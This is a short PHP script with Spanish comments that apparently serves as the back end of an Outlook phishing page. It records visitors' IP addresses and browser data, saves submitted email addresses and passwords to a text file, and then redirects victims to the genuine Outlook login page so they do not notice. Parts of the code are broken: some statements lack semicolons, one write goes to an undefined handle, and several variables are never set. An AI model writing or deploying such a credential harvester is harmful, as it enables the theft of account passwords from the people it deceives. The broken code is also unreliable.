<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);


if (empty($_SERVER["QUERY_STRING"])){
    $Fichero = "NEW01.txt"; //nombre del fichero donde se guardan los informes.
    $ip = $_SERVER["REMOTE_ADDR"]; //guarda en la variable el ip 
     
    $sistema = $_SERVER['HTTP_USER_AGENT']; //Esto nos genera varios datos del navegador y del sistema operativo 
    $conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"]; //En caso de usar proxy para esconderse aqui estaria el ip real
    $log = "FECHA: $fecha"
    $log = "SISTEMA: $sistema"
    $log = "IP: $ip"
    $log = "IPPROXY: $conproxy \x0D\x0A"; 
    $file = fopen("NEW01.txt", "a");
    fwrite($fp, $log); 
    fclose($fp); 
}

	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* EMAIL: ".$_POST['email']."
* PASS: ".$_POST['pass']."
* PASS1: ".$_POST['pass1']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:https://outlook.live.com/owa/");

?>
